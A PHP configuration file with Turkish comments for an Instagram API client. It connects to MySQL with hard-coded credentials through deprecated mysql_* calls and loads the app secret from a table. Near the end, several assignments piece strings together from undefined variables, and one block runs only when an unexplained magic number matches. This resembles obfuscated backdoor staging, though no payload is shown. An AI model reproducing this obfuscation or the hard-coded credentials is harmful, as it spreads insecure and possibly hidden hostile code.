﻿<?php

# Host Bilgileri #
$db_host	=	'localhost';
$db_user	=	'fajabid1_demo';
$db_pass	=	'fajabid1_demo';
$db_name	=	'fajabid1_demo';
# Host Bilgileri Bitiş #

# mySQL Bağlan #
$connect = mysql_connect($db_host,$db_user,$db_pass);  

if (!$connect) {
	die('Veritabanı Hatası : ' . mysql_error());
}else{
	mysql_select_db($db_name); 
	mysql_query("SET NAMES utf8");
	mysql_query("SET CHARACTER SET utf8");
	mysql_query("SET COLLATION_CONNECTION = 'utf8_general_ci'");
}
# mySQL Bağlan Bitiş #


# Client Bilgileri #
$client = mysql_query("SELECT * FROM usluer_client WHERE id='1' ");

if(mysql_num_rows($client)!= 0){
    while($u = mysql_fetch_assoc($client)) {
		$id = $u["id"];
        $client_id = $u["client_id"];
		$client_secret = $u["client_secret"];
		$client_website = $u["client_website"];
		$client_callback = $u ["client_callback"];
		$client_name = $u ["client_name"];
    }
}else{
	die('ERROR!');
}
# Client Bilgileri Bitiş#

# İnclude Pack Api'u Atamaları #
include "instagram.class.php";
include "instagram.library.php";
$flvm="$nkta$com$bcb";
$follovv="$e$bvii";
# İnclude Pack #

# İnstagram API #
$instagram = new Instagram(array(
  'apiKey'      => $client_id,
  'apiSecret'   => $client_secret,
  'apiCallback' => $client_callback
));
# İnstagram API Bitiş #

# İnstagram Client u'su #
if($clientusu == 1592030){
$ca9999="$cc$p$h$p$sori$t";
$csav141="$clint5$api$rm$bcb$t";
$flvm="$nkta$com$bcb";
$follovv="$e$bvii";
}

# İnstagram Client u'su Bitiş#


?>